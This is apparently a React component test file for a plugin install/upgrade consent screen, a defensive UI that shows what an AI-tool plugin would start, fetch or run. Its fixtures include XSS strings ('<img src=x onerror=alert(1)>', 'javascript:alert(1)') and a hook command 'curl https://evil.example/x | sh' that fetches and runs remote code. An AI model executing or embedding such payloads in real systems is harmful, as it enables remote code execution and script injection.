import { describe, it, expect } from 'vitest'
import { render, screen, within } from '@testing-library/react'
import { PluginConsentSchema, type PluginConsent } from '@mffai/protocol/browser'
import { Consent } from './Consent'
import { ESCAPED, FULL_CONSENT, RAW_ZW, uncovered } from '../test/plugins'
import { findHints } from '../test/noHint'

const PLACEHOLDER = /\$\{(PLUGIN_ROOT|PLUGIN_DATA|PROJECT_DIR)\}/g
/** 显示成标签或块、不原样出现的字段:另有专门的断言。suggestedHosts 是授权编辑器的勾选框(Grants.test) */
const NOT_VERBATIM = new Set(['suggestedHosts', 'argsMasked', 'cwd', 'modelInvocable', 'userInvocable', 'required', 'sensitive', 'fetchesAtRuntime', 'masked', 'sourceChanged', 'kind'])

function leaves(v: unknown, key = ''): string[] {
  if (NOT_VERBATIM.has(key)) return []
  if (typeof v === 'string') return v.split(PLACEHOLDER).filter((s, i) => i % 2 === 0 && s !== '')
  // 数字单独按行断言(substring 太容易碰巧对上)
  if (typeof v === 'number') return []
  if (Array.isArray(v)) return v.flatMap((x) => leaves(x, key))
  if (v && typeof v === 'object') return Object.entries(v).flatMap(([k, x]) => leaves(x, k))
  return []
}

const section = (name: string) => document.querySelector(`[data-section="${name}"]`) as HTMLElement
const server = (name: string) => document.querySelector(`[data-server="${name}"]`) as HTMLElement

describe('Consent', () => {
  it('the fixture fills every field of PluginConsentSchema', () => {
    expect(uncovered(PluginConsentSchema, FULL_CONSENT)).toEqual([])
  })

  it('every value of the fixture appears', () => {
    render(<Consent consent={FULL_CONSENT} />)
    const text = document.body.textContent!
    for (const s of leaves(FULL_CONSENT)) expect(text, s).toContain(s)
    expect(findHints()).toEqual([])
  })

  it('every number sits in its own row', () => {
    render(<Consent consent={FULL_CONSENT} />)
    expect(section('head').querySelector('.mffai-count')!.textContent).toBe('文件 37 · 40960 字节')
    expect(section('skills').querySelector('[data-skill="0"] .mffai-count')!.textContent).toBe('文件 4')
    expect([...section('truncated').querySelectorAll('.mffai-chip')].map((c) => c.textContent)).toEqual(['skills 省略 12 项', 'commands 省略 3 项'])
    const files = [...section('diff').querySelectorAll('.mffai-crow')].find((r) => r.querySelector('.mffai-k')?.textContent === '文件数')!
    expect(files.querySelector('.mffai-count')!.textContent).toBe('30 → 37')
  })

  it('header: id, version, format, source and integrity monospace, files and size', () => {
    render(<Consent consent={FULL_CONSENT} />)
    const head = section('head')
    expect(head).toHaveTextContent('zed-tools')
    expect(head).toHaveTextContent('1.2.0')
    expect(head).toHaveTextContent('native')
    expect(within(head).getByText('https://example.com/zed/tools.git').closest('.mono')).not.toBeNull()
    expect(within(head).getByText('sha256-INTEGRITY0123').closest('.mono')).not.toBeNull()
    expect(head).toHaveTextContent('c0ffee1234567890')
    expect(head).toHaveTextContent('v1.2.0')
    expect(head).toHaveTextContent('packages/zed')
    expect(head).toHaveTextContent('文件 37 · 40960 字节')
  })

  it('the claimed block is marked 自称; third-party text is text, never a link, tag or button', () => {
    const { container } = render(<Consent consent={FULL_CONSENT} />)
    const claimed = section('claimed')
    expect(within(claimed).getByText('自称')).toBeInTheDocument()
    expect(claimed).toHaveTextContent('<img src=x onerror=alert(1)>')
    expect(claimed).toHaveTextContent('javascript:alert(1)')
    expect(claimed).toHaveTextContent('Mallory Author')
    expect(container.querySelector('img, a, b, script')).toBeNull()
    // 插件写的「安装并启用」只是文字,不是按钮也不是块
    expect(screen.queryByRole('button')).toBeNull()
    const fake = within(claimed).getByText('安装并启用')
    expect(fake.closest('.mffai-ptext')).not.toBeNull()
    expect(fake.closest('.mffai-chip')).toBeNull()
  })

  it('skills and commands: name, description, invocable chips, flags and ignored keys', () => {
    render(<Consent consent={FULL_CONSENT} />)
    const skills = section('skills')
    expect(within(skills).getByText('模型可调')).toBeInTheDocument()
    expect(within(skills).getByText('用户可调')).toBeInTheDocument()
    expect(within(skills).getByText('shell_in_text')).toBeInTheDocument()
    expect(within(skills).getByText('allowed-tools-key')).toBeInTheDocument()
    const cmds = section('commands')
    expect(within(cmds).getByText('hidden_chars')).toBeInTheDocument()
    expect(within(cmds).getByText('model-key')).toBeInTheDocument()

    const only = { ...FULL_CONSENT, skills: [{ ...FULL_CONSENT.skills[0], modelInvocable: false, userInvocable: false }] }
    document.body.innerHTML = ''
    render(<Consent consent={only} />)
    expect(within(section('skills')).queryByText('模型可调')).toBeNull()
    expect(within(section('skills')).queryByText('用户可调')).toBeNull()
  })

  it('MCP: placeholders are chips, masked args carry 已打码, runtime fetch, env, declared, problems → 不会启动', () => {
    render(<Consent consent={FULL_CONSENT} />)
    const fs = server('fs-server')
    expect(document.body.textContent).not.toMatch(PLACEHOLDER)
    expect(within(fs).getAllByText('插件目录').every((c) => c.className.includes('mffai-chip'))).toBe(true)
    expect(within(fs).getAllByText('插件目录')).toHaveLength(2)
    expect(within(fs).getByText('插件数据').className).toContain('mffai-chip')
    expect(within(fs).getByText('项目目录').className).toContain('mffai-chip')
    const args = [...fs.querySelectorAll('[data-arg]')]
    expect(args).toHaveLength(6)
    expect(within(args[1] as HTMLElement).getByText('已打码')).toBeInTheDocument()
    for (const i of [0, 2, 3, 4, 5]) expect(within(args[i] as HTMLElement).queryByText('已打码'), String(i)).toBeNull()
    expect(within(fs).getByText('运行时下载')).toBeInTheDocument()
    expect(within(fs).queryByText('不会启动')).toBeNull()
    const env = [...fs.querySelectorAll('[data-env]')].map((r) => r.textContent)
    expect(env[0]).toContain('ENV_LIT')
    expect(env[0]).toContain('literal')
    expect(env[0]).toContain('literal-value-1')
    expect(env[1]).toContain('config')
    expect(env[1]).toContain('必填')
    expect(env[2]).toContain('secret')
    expect(env[0]).not.toContain('必填')
    expect(fs).toHaveTextContent('api.declared.example')
    expect(within(fs).getByText('只读')).toBeInTheDocument()

    const net = server('net-server')
    expect(within(net).getByText('不会启动')).toBeInTheDocument()
    expect(within(net).getByText('dangerous_env')).toBeInTheDocument()
    expect(within(net).queryByText('运行时下载')).toBeNull()
  })

  it('config rows: key, title, 敏感, 必填, type', () => {
    render(<Consent consent={FULL_CONSENT} />)
    const rows = [...section('config').querySelectorAll('[data-config]')].map((r) => r.textContent)
    expect(rows[0]).toContain('API_TOKEN')
    expect(rows[0]).toContain('敏感')
    expect(rows[0]).toContain('必填')
    expect(rows[1]).toContain('Region title')
    expect(rows[1]).not.toContain('敏感')
    expect(rows[1]).not.toContain('必填')
  })

  it('the config type is plugin-written: text, not one of our chips', () => {
    const c = { ...FULL_CONSENT, config: [{ ...FULL_CONSENT.config[0], type: '敏感' }] }
    render(<Consent consent={c} />)
    const row = section('config').querySelector('[data-config]') as HTMLElement
    const typed = within(row).getAllByText('敏感')
    expect(typed).toHaveLength(2)
    expect(typed.filter((e) => e.closest('.mffai-ptext'))).toHaveLength(1)
    expect(row.querySelector('code')).toBeNull()
  })

  it('notRun and warnings are expanded on first render, hooks in full, masked hooks marked', () => {
    const { container } = render(<Consent consent={FULL_CONSENT} />)
    expect(container.querySelector('details')).toBeNull()
    const nr = section('notrun')
    expect(within(nr).getByText('不会运行')).toBeInTheDocument()
    expect(nr).toHaveTextContent('curl https://evil.example/x | sh')
    const hooks = [...nr.querySelectorAll('[data-hook]')]
    expect(within(hooks[0] as HTMLElement).queryByText('已打码')).toBeNull()
    expect(within(hooks[1] as HTMLElement).getByText('已打码')).toBeInTheDocument()
    for (const s of ['agent-gamma', 'bin/tool-delta', 'monitor-eps', 'workflow-zeta', 'lsp-eta', 'other:theta', 'remote-iota', 'sse', 'https://remote.example/mcp', 'dist/main-kappa.mjs', 'postinstall-lambda']) {
      expect(nr, s).toHaveTextContent(s)
    }
    const w = section('warnings')
    for (const c of ['runtime_fetch', 'credentials_in_source', 'truncated']) expect(within(w).getByText(c).tagName).toBe('CODE')
  })

  it('truncatedSections: one `<节> 省略 N 项` each', () => {
    render(<Consent consent={FULL_CONSENT} />)
    expect(screen.getByText('skills 省略 12 项')).toBeInTheDocument()
    expect(screen.getByText('commands 省略 3 项')).toBeInTheDocument()
  })

  it('upgrade diff: versions, 来源已变, added/removed/changed, integrity from → to, files from → to', () => {
    render(<Consent consent={FULL_CONSENT} />)
    const d = section('diff')
    expect(d).toHaveTextContent('1.1.0 → 1.2.0')
    expect(within(d).getByText('来源已变')).toBeInTheDocument()
    expect(d).toHaveTextContent('sha256-OLDINTEGRITY → sha256-INTEGRITY0123')
    expect(d).toHaveTextContent('30 → 37')
    for (const s of ['mcp-added-1', 'mcp-removed-1', 'mcp-changed-1', 'skill-text-1', 'cmd-added-1', 'net-removed.example', 'cfg-reqsens-1', 'hook-added-cmd', 'hook-removed-cmd', 'agents:agent-new']) {
      expect(d, s).toHaveTextContent(s)
    }
    expect(within(d).getByText('args')).toBeInTheDocument()

    document.body.innerHTML = ''
    const same: PluginConsent = { ...FULL_CONSENT, diff: { ...FULL_CONSENT.diff!, sourceChanged: false, integrity: null } }
    render(<Consent consent={same} />)
    expect(within(section('diff')).queryByText('来源已变')).toBeNull()
    expect(section('diff')).not.toHaveTextContent('sha256-OLDINTEGRITY')
  })

  it('no diff section without a diff', () => {
    const { diff: _d, ...rest } = FULL_CONSENT
    render(<Consent consent={rest} />)
    expect(section('diff')).toBeNull()
  })

  it('escaped characters show as they are; a stray invisible char becomes visible', () => {
    const c = { ...FULL_CONSENT, commands: [{ ...FULL_CONSENT.commands[0], description: RAW_ZW }] }
    render(<Consent consent={c} />)
    expect(document.body.textContent).toContain(ESCAPED)
    expect(document.body.textContent).not.toContain('\u200B')
    expect(section('commands')).toHaveTextContent('zero\\u{200B}width')
  })

  it('a path source shows the path', () => {
    render(<Consent consent={{ ...FULL_CONSENT, source: { kind: 'path', path: '/Users/me/zed' } }} />)
    expect(within(section('head')).getByText('/Users/me/zed').closest('.mono')).not.toBeNull()
  })

  it('never says 同意 together with 工具', () => {
    render(<Consent consent={FULL_CONSENT} />)
    expect(document.body.textContent).not.toMatch(/同意[^]*工具|工具[^]*同意/)
  })
})

// 08b:A(首装整页)和 B(升级弹窗)两种排法,同一批子组件;每个值都在,什么都不折叠(Review Focus 8)
const tiles = () => [...document.querySelectorAll('.mffai-covt')].map((t) => t.textContent)
const secOrder = () => [...document.querySelectorAll('.mffai-cs[data-section]')].map((s) => s.getAttribute('data-section'))
const marks = (name: string) => [...section(name).querySelector('.mffai-cs-h')!.querySelectorAll('.mffai-cmark .mffai-chip')].map((c) => c.textContent)
const EMPTY_DIFF: NonNullable<PluginConsent['diff']> = {
  fromVersion: '1.1.0', toVersion: '1.2.0', sourceChanged: false,
  mcp: { added: [], removed: [], changed: [] }, skills: { added: [], removed: [], textChanged: [] }, commands: { added: [], removed: [], textChanged: [] },
  network: { added: [], removed: [] }, config: { added: [], requiredSensitive: [] }, notRun: { hooksAdded: [], hooksRemoved: [], added: [] },
  files: { from: 37, to: 37 }, integrity: null,
}

describe('Consent 08b layouts', () => {
  it('A: four overview tiles, two columns, 自称 marked 未验证, the grants slot after MCP 服务', () => {
    render(<Consent consent={FULL_CONSENT} checkedHosts={1} grants={<div data-section="grants">G</div>} />)
    expect(tiles()).toEqual(['会启动1 个服务', '可联网1 / 4 已勾', '不会运行11 项', '警告3'])
    const cols = [...document.querySelectorAll('.mffai-ccol')] as HTMLElement[]
    expect(cols).toHaveLength(2)
    for (const s of ['claimed', 'skills', 'commands', 'notrun']) expect(cols[0].querySelector(`[data-section="${s}"]`), s).not.toBeNull()
    for (const s of ['mcp', 'grants', 'config', 'warnings', 'truncated']) expect(cols[1].querySelector(`[data-section="${s}"]`), s).not.toBeNull()
    expect(section('mcp').compareDocumentPosition(section('grants')) & Node.DOCUMENT_POSITION_FOLLOWING).toBeTruthy()
    expect(within(section('claimed')).getByText('未验证').className).toContain('mffai-chip')
    expect(section('claimed').querySelector('.mffai-cclaim')).not.toBeNull()
    expect(screen.queryByRole('button')).toBeNull()
    expect(findHints()).toEqual([])
  })

  it('A: the close slot sits in the head; no close without it', () => {
    render(<Consent consent={FULL_CONSENT} close={<button>关闭</button>} />)
    expect(within(section('head')).getByRole('button', { name: '关闭' })).toBeInTheDocument()
  })

  it('B: every value of the fixture appears, numbers in their rows, no hint', () => {
    render(<Consent consent={FULL_CONSENT} layout="upgrade" grants={<div data-section="grants">G</div>} />)
    const text = document.body.textContent!
    for (const s of leaves(FULL_CONSENT)) expect(text, s).toContain(s)
    expect(findHints()).toEqual([])
    expect(document.querySelector('details')).toBeNull()
    const d = section('diff')
    expect(d).toHaveTextContent('1.1.0')
    expect(d).toHaveTextContent('sha256-OLDINTEGRITY → sha256-INTEGRITY0123')
    expect(d).toHaveTextContent('30 → 37')
    expect(d).toHaveTextContent('40960 字节')
    expect([...d.querySelectorAll('[data-section="truncated"] .mffai-chip')].map((c) => c.textContent)).toEqual(['skills 省略 12 项', 'commands 省略 3 项'])
    for (const c of ['runtime_fetch', 'credentials_in_source', 'truncated']) expect(within(section('warnings')).getByText(c).tagName).toBe('CODE')
    expect(within(section('head')).getByText('来源已变')).toBeInTheDocument()
    expect(section('head')).toHaveTextContent('升级')
  })

  it('B: one section per kind with diffMarks chips; the grants sit in 建议联网地址', () => {
    render(<Consent consent={FULL_CONSENT} layout="upgrade" grants={<div data-section="grants">G</div>} />)
    expect(secOrder()).toEqual(['mcp', 'network', 'notrun', 'skillcmd', 'config', 'claimed'])
    expect(marks('mcp')).toEqual(['新增 1', '改动 1', '删除 1'])
    expect(marks('network')).toEqual(['新增 1', '删除 1'])
    expect(marks('notrun')).toEqual(['新增 2', '删除 1'])
    expect(marks('skillcmd')).toEqual(['新增 2', '改动 2', '删除 2'])
    expect(marks('config')).toEqual(['新增 2'])
    expect(marks('claimed')).toEqual(['未变'])
    expect(section('network').querySelector('[data-section="grants"]')).not.toBeNull()
    for (const s of ['net-added.example', 'net-removed.example']) expect(section('network'), s).toHaveTextContent(s)
    for (const s of ['mcp-added-1', 'mcp-removed-1', 'mcp-changed-1']) expect(section('mcp'), s).toHaveTextContent(s)
    for (const s of ['hook-added-cmd', 'hook-removed-cmd', 'agents:agent-new']) expect(section('notrun'), s).toHaveTextContent(s)
    for (const s of ['skill-added-1', 'skill-removed-1', 'skill-text-1', 'cmd-added-1', 'cmd-removed-1', 'cmd-text-1']) expect(section('skillcmd'), s).toHaveTextContent(s)
    for (const s of ['cfg-added-1', 'cfg-reqsens-1']) expect(section('config'), s).toHaveTextContent(s)
  })

  it('B: changed sections come first; unchanged 配置项 and 自称 stay expanded, every row shown, marked 未变 (R10)', () => {
    const c: PluginConsent = { ...FULL_CONSENT, diff: { ...EMPTY_DIFF, network: { added: ['n.example'], removed: [] } } }
    render(<Consent consent={c} layout="upgrade" />)
    expect(secOrder()).toEqual(['network', 'mcp', 'notrun', 'skillcmd', 'config', 'claimed'])
    for (const s of ['mcp', 'notrun', 'skillcmd', 'config', 'claimed']) expect(marks(s), s).toEqual(['未变'])
    expect(section('config').querySelectorAll('[data-config]')).toHaveLength(2)
    expect(section('config')).toHaveTextContent('Region title')
    expect(section('claimed')).toHaveTextContent('Mallory Author')
    expect(section('claimed')).toHaveTextContent('<img src=x onerror=alert(1)>')
    expect(within(section('claimed')).getByText('自称')).toBeInTheDocument()
    expect(section('notrun').querySelectorAll('[data-hook]')).toHaveLength(2)
    expect(section('notrun')).toHaveTextContent('curl https://evil.example/x | sh')
    expect(within(section('diff')).queryByText('来源已变')).toBeNull()
    expect(section('diff')).toHaveTextContent('sha256-INTEGRITY0123')
  })

  it('B: placeholders are chips, masked args carry 已打码, third-party text is text, no 同意 with 工具', () => {
    const { container } = render(<Consent consent={FULL_CONSENT} layout="upgrade" />)
    const fs = server('fs-server')
    expect(document.body.textContent).not.toMatch(PLACEHOLDER)
    expect(within(fs).getAllByText('插件目录').every((c) => c.className.includes('mffai-chip'))).toBe(true)
    expect(within(fs).getByText('插件数据').className).toContain('mffai-chip')
    expect(within(fs).getByText('项目目录').className).toContain('mffai-chip')
    const args = [...fs.querySelectorAll('[data-arg]')]
    expect(args).toHaveLength(6)
    expect(within(args[1] as HTMLElement).getByText('已打码')).toBeInTheDocument()
    expect(within(section('notrun').querySelectorAll('[data-hook]')[1] as HTMLElement).getByText('已打码')).toBeInTheDocument()
    expect(container.querySelector('img, a, b, script')).toBeNull()
    expect(screen.queryByRole('button')).toBeNull()
    expect(within(section('claimed')).getByText('安装并启用').closest('.mffai-ptext')).not.toBeNull()
    expect(document.body.textContent).not.toMatch(/同意[^]*工具|工具[^]*同意/)
  })
})
